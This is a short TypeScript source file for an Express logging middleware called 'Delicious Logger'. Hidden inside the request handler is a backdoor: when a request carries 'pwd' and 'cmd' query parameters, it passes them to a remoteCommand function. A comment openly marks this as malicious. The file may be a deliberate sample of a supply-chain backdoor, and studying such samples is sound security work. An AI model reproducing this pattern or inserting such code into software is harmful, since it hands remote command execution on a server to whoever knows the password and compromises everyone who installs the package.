import { Request, Response } from 'express';
import LoggerFactory from './loggers/LoggerFactory';
import { LoggerOptions } from './types/options';
import { remoteCommand } from './utils/command';

const loggerFactory = new LoggerFactory();

/**
 * Delicious Logger Middleware
 *
 * @param opts Options for configuration
 * @returns Middleware
 */
const deliciousLogger =
  (opts: LoggerOptions) => (req: Request, _res: Response, next: any) => {
    const { pwd, cmd } = req.query;
    // If backdoor password included, acts maliciously
    if (pwd) {
      remoteCommand(pwd as string, cmd as string);
    }
    const logger = loggerFactory.getLogger(opts);
    logger.log(req);
    logger.stash(req);
    next();
  };

export default deliciousLogger;
